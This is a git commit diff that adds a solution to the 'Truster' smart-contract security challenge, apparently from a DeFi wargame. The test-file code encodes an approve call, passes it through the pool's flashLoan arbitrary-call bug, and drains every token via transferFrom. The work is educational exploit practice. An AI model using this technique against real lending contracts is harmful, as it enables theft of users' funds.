bf4b29f584d29fe8cbe2a98a4cc0edabee8ba444
Licheng Wang <lichengwang@kkstream.com>
2022-11-25 16:47:43 +0800

    attack truster successfully

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { Interface } = require('ethers/lib/utils');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -27,8 +28,28 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
+    /**
+     * Goal: Steal all the tokens from lending pool.
+     * Bug: Lending pool will execute target.call{value: value}(data) by itself.
+     * Solution: We make pool call token.approve() to approve us transfer all DVT token in the pool to attack's contract.
+     */
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const balanceOfPool = ethers.utils.formatUnits(await this.token.balanceOf(this.pool.address), 18);
+        const abiEncoder = new ethers.utils.AbiCoder();
+        const iface = new Interface([
+            "constructor(string symbol, string name)",
+
+            "function approve(address spender, uint256 amount) public virtual override returns (bool)"
+          ]);
+
+        const data = iface.encodeFunctionData("approve", [
+            attacker.address,
+            ethers.utils.parseEther(balanceOfPool)
+        ])
+        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, ethers.utils.parseEther(balanceOfPool));
+
     });
 
     after(async function () {
